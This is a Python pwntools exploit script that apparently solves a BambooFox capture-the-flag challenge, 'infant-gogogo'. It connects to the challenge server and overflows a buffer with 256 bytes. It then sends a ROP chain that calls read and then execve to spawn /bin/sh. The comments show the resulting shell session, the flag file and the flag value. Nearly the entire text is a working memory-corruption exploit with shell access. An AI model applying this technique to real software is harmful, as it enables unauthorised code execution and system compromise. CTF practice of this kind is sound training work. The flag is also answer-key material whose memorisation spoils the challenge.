from pwn import *

#r=process('./infant-gogogo')
#nc bamboofox.cs.nctu.edu.tw 58795

host = "bamboofox.cs.nctu.edu.tw"
port = 58795
r = remote(host,port)

#gdb.attach(r)


pop_rax_ret=0x0000000000404656
syscall=0x00000000004520b9 
#0x0000000000485abd : pop rdi ; cmp dword ptr [rcx], eax ; add byte ptr [rax + 0x39], cl ; ret
pop_rdi=0x0000000000485abd

payload="A"*256
#0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
#0x0000000000408437 : pop rsi ; dec dword ptr [rax + 0x21] ; ret
buf=0x0052e2a0
rsi=0x0000000000408437
rdx=0x0000000000413d6d

#call read rdi :fd=0 
#rsi:buf 
#rdx:size 
#rax:0x00
payload+=p64(pop_rax_ret)+p64(buf+0x200)+p64(pop_rdi)+p64(0x0)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x8)+p64(pop_rax_ret)+p64(0)+p64(syscall)


#rsi=0
#rdx=0
payload+=p64(pop_rax_ret)+p64(buf+0x200)+p64(pop_rdi)+p64(buf+0x300)+p64(rsi)+p64(buf+0x200)+p64(rdx)+p64(0x0)+p64(rsi)+p64(0x0)+p64(pop_rax_ret)+p64(0x3b)+p64(syscall)

sleep(1)
r.sendline(payload)

sleep(1)

r.sendline("/bin/sh\x00")
r.sendline("ls -al")

r.interactive()

#$ cd home
#$ ls
#ctf
#$ cd ctf
#$ ls
#ctf
#flag
#infant-gogogo
#$ cat flag
#BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}
